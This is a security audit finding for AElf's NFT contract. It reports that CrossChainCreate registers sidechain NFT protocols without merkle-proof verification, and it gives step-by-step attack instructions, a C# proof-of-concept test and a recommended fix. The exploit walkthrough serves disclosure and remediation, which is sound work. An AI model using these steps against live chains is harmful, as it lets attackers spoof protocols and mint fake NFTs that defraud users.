# Audit Report

## Title
Missing Cross-Chain Verification in NFT Protocol Creation Allows Unauthorized Protocol Registration

## Summary
The `CrossChainCreate` method in the NFT contract lacks cryptographic cross-chain verification, allowing attackers to create unauthorized NFT protocols on sidechains by exploiting legitimately synced tokens. This grants them Creator privileges and exclusive minting rights for protocols that never existed on the source chain, fundamentally breaking cross-chain integrity guarantees.

## Finding Description

The NFT contract's `CrossChainCreate` method creates NFT protocols on sidechains without verifying that the protocol actually exists on the source chain through merkle proof validation. [1](#0-0) 

**Root Cause:**

The method performs only two checks:
1. Whether the protocol already exists locally (line 79)
2. Whether the token exists in the local TokenContract state (lines 80-85)

It then directly extracts metadata from the token's ExternalInfo and assigns the Creator from the token issuer, adding them to the MinterList without any cross-chain proof verification. [2](#0-1) 

**Contrast with Secure Implementation:**

The TokenContract's `CrossChainCreateToken` method properly validates cross-chain operations by calling `CrossChainVerify` with merkle path verification at line 488. [3](#0-2) 

This verification method calls the CrossChainContract's `VerifyTransaction` to cryptographically prove the transaction occurred on the source chain. [4](#0-3) 

The input structures further demonstrate this disparity. `CrossChainCreateTokenInput` contains fields for source chain ID, parent chain height, transaction bytes, and merkle path. [5](#0-4) 

In contrast, `CrossChainCreateInput` only contains a symbol field with no verification data. [6](#0-5) 

**Attack Execution:**

1. Attacker creates a token on mainchain via `TokenContract.Create` with themselves as issuer, including NFT metadata (base URI, token ID reuse, NFT type) in ExternalInfo
2. Token is synced to sidechain via legitimate `CrossChainCreateToken` (with proper merkle verification)
3. Attacker calls `NFTContract.CrossChainCreate` on sidechain with the token symbol
4. NFT protocol is created with attacker as Creator and sole minter, despite no corresponding NFT protocol existing on mainchain

The attacker then has full control over minting for that protocol, as the minter check verifies against the MinterList. [7](#0-6) 

Only the Creator can add or remove minters, cementing the attacker's control. [8](#0-7) [9](#0-8) 

## Impact Explanation

**Severity: High**

This vulnerability breaks the fundamental cross-chain security guarantee that sidechain NFT protocols are legitimate synchronizations from the mainchain.

**Concrete Harms:**
1. **Unauthorized Minter Privileges**: Attackers gain exclusive minting rights for NFT protocols that shouldn't exist on sidechains
2. **Protocol Integrity Violation**: Sidechain NFT state diverges from mainchain without any legitimate cross-chain operation
3. **User Deception**: Sidechain users interact with fake NFT protocols believing they're authentic cross-chain synced assets
4. **Economic Losses**: Fake NFTs could be minted, traded, and cause financial harm to users who believe they're acquiring legitimate cross-chain assets
5. **Ecosystem Trust Damage**: Undermines confidence in the entire cross-chain NFT infrastructure

**Affected Parties:**
- Legitimate NFT protocol creators whose brands/symbols could be spoofed on sidechains
- Users on sidechains who cannot distinguish fake from legitimate protocols
- The overall integrity of AElf's cross-chain ecosystem

## Likelihood Explanation

**Probability: High**

**Attacker Requirements:**
- Ability to create a token on mainchain (requires seed NFT or whitelist status - seed NFTs are obtainable through normal market operations)
- Ability to call public contract methods (no special privileges required) [10](#0-9) 

**Attack Complexity: Low**

The attack requires only two standard operations:
1. Create a token on mainchain with NFT metadata in ExternalInfo
2. Call `CrossChainCreate` on sidechain after token synchronization

**Feasibility Conditions:**
- NFT type prefix must be registered (e.g., "AR" for art) - these are governance-registered and publicly available
- Token must be synced to sidechain first (can be done by attacker or any third party)
- Protocol with that symbol must not already exist on sidechain [11](#0-10) 

**Detection Difficulty:**

The attack is difficult to detect because:
- The transaction succeeds normally
- Events are fired as expected
- The token genuinely exists
- Only off-chain comparison with mainchain state would reveal the discrepancy

## Recommendation

Add merkle path verification to the `CrossChainCreate` method similar to `TokenContract.CrossChainCreateToken`:

1. Update `CrossChainCreateInput` proto to include:
   - `int32 from_chain_id`
   - `int64 parent_chain_height`
   - `bytes transaction_bytes`
   - `aelf.MerklePath merkle_path`

2. Implement verification in `CrossChainCreate`:
   - Parse and validate the original transaction
   - Call `CrossChainVerify` with merkle path
   - Verify the transaction is from a legitimate NFT protocol creation on the source chain
   - Extract protocol information from verified transaction instead of local token state

3. Add a helper method similar to `TokenContract_Helper.CrossChainVerify` to verify that the source transaction was an actual `NFTContract.Create` call that created the protocol on the source chain.

## Proof of Concept

```csharp
// Proof of Concept Test
[Fact]
public async Task CrossChainCreate_Without_Verification_Vulnerability()
{
    // 1. On mainchain: Attacker creates a token with NFT metadata (NOT via NFTContract.Create)
    var attackerAddress = SampleAddress.AddressList[0];
    var tokenSymbol = "FAKE-TOKEN-1";
    
    // Create token with NFT metadata in ExternalInfo
    await MainChainTokenContract.Create.SendAsync(new CreateInput
    {
        Symbol = tokenSymbol,
        TokenName = "Fake NFT Token",
        TotalSupply = 1000,
        Decimals = 0,
        Issuer = attackerAddress,
        IsBurnable = true,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                {"aelf_nft_type", "Art"},
                {"aelf_nft_base_uri", "https://attacker.com/"},
                {"aelf_nft_token_id_reuse", "false"}
            }
        }
    });
    
    // 2. Token syncs to sidechain (legitimate cross-chain operation with verification)
    // ... CrossChainCreateToken call with merkle proof ...
    
    // 3. On sidechain: Attacker calls CrossChainCreate
    var result = await SideChainNFTContract.CrossChainCreate.SendAsync(new CrossChainCreateInput
    {
        Symbol = tokenSymbol
    });
    
    // 4. Verify attack succeeded: NFT protocol created with attacker as Creator
    var protocolInfo = await SideChainNFTContract.GetNFTProtocolInfo.CallAsync(new StringValue { Value = tokenSymbol });
    Assert.Equal(attackerAddress, protocolInfo.Creator);
    
    // 5. Verify attacker has minting rights
    var minterList = await SideChainNFTContract.GetMinterList.CallAsync(new StringValue { Value = tokenSymbol });
    Assert.Contains(attackerAddress, minterList.Value);
    
    // 6. Verify NO NFT protocol exists on mainchain (only the token exists)
    var mainchainProtocol = await MainChainNFTContract.GetNFTProtocolInfo.CallAsync(new StringValue { Value = tokenSymbol });
    Assert.Null(mainchainProtocol.Symbol); // Protocol doesn't exist on mainchain
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L75-85)
```csharp
    public override Empty CrossChainCreate(CrossChainCreateInput input)
    {
        MakeSureTokenContractAddressSet();
        InitialNFTTypeNameMap();
        Assert(State.NftProtocolMap[input.Symbol] == null, $"Protocol {input.Symbol} already created.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(new GetTokenInfoInput
        {
            Symbol = input.Symbol
        });
        if (string.IsNullOrEmpty(tokenInfo.Symbol))
            throw new AssertionException($"Token info {input.Symbol} not exists.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L100-113)
```csharp
            Creator = tokenInfo.Issuer,
            IsBurnable = tokenInfo.IsBurnable,
            IssueChainId = tokenInfo.IssueChainId,
            IsTokenIdReuse = isTokenIdReuse,
            Metadata = new Metadata { Value = { tokenInfo.ExternalInfo.Value } },
            ProtocolName = tokenInfo.TokenName,
            NftType = nftTypeFullName
        };
        State.NftProtocolMap[input.Symbol] = nftProtocolInfo;

        State.MinterListMap[input.Symbol] = new MinterList
        {
            Value = { nftProtocolInfo.Creator }
        };
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-65)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L478-490)
```csharp
    public override Empty CrossChainCreateToken(CrossChainCreateTokenInput input)
    {
        var tokenContractAddress = State.CrossChainTransferWhiteList[input.FromChainId];
        Assert(tokenContractAddress != null,
            $"Token contract address of chain {ChainHelper.ConvertChainIdToBase58(input.FromChainId)} not registered.");

        var originalTransaction = Transaction.Parser.ParseFrom(input.TransactionBytes);

        AssertCrossChainTransaction(originalTransaction, tokenContractAddress, nameof(ValidateTokenInfoExists));
        var originalTransactionId = originalTransaction.GetHash();
        CrossChainVerify(originalTransactionId, input.ParentChainHeight, input.FromChainId, input.MerklePath);
        var validateTokenInfoExistsInput =
            ValidateTokenInfoExistsInput.Parser.ParseFrom(originalTransaction.Params);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L236-250)
```csharp
    private void CrossChainVerify(Hash transactionId, long parentChainHeight, int chainId, MerklePath merklePath)
    {
        var verificationInput = new VerifyTransactionInput
        {
            TransactionId = transactionId,
            ParentChainHeight = parentChainHeight,
            VerifiedChainId = chainId,
            Path = merklePath
        };
        var address = Context.GetContractAddressByName(SmartContractConstants.CrossChainContractSystemName);

        var verificationResult = Context.Call<BoolValue>(address,
            nameof(ACS7Container.ACS7ReferenceState.VerifyTransaction), verificationInput);
        Assert(verificationResult.Value, "Cross chain verification failed.");
    }
```

**File:** protobuf/token_contract.proto (L571-580)
```text
message CrossChainCreateTokenInput {
    // The chain id of the chain on which the token was created.
    int32 from_chain_id = 1;
    // The height of the transaction that created the token.
    int64 parent_chain_height = 2;
    // The transaction that created the token.
    bytes transaction_bytes = 3;
    // The merkle path created from the transaction that created the transaction.
    aelf.MerklePath merkle_path = 4;
}
```

**File:** protobuf/nft_contract.proto (L132-134)
```text
message CrossChainCreateInput {
    string symbol = 1;
}
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L338-338)
```csharp
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L358-358)
```csharp
        Assert(Context.Sender == protocolInfo.Creator, "No permission.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L398-400)
```csharp
        var minterList = GetMinterList(tokenInfo);
        Assert(minterList.Value.Contains(Context.Sender), "No permission to mint.");
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Incorrect chain.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Helpers.cs (L39-63)
```csharp
    private NFTTypes InitialNFTTypeNameMap()
    {
        if (State.NFTTypes.Value != null) return State.NFTTypes.Value;

        var nftTypes = new NFTTypes();
        nftTypes.Value.Add("XX", NFTType.Any.ToString());
        nftTypes.Value.Add("AR", NFTType.Art.ToString());
        nftTypes.Value.Add("MU", NFTType.Music.ToString());
        nftTypes.Value.Add("DN", NFTType.DomainNames.ToString());
        nftTypes.Value.Add("VW", NFTType.VirtualWorlds.ToString());
        nftTypes.Value.Add("TC", NFTType.TradingCards.ToString());
        nftTypes.Value.Add("CO", NFTType.Collectables.ToString());
        nftTypes.Value.Add("SP", NFTType.Sports.ToString());
        nftTypes.Value.Add("UT", NFTType.Utility.ToString());
        nftTypes.Value.Add("BA", NFTType.Badges.ToString());
        State.NFTTypes.Value = nftTypes;

        foreach (var pair in nftTypes.Value)
        {
            State.NFTTypeShortNameMap[pair.Value] = pair.Key;
            State.NFTTypeFullNameMap[pair.Key] = pair.Value;
        }

        return nftTypes;
    }
```
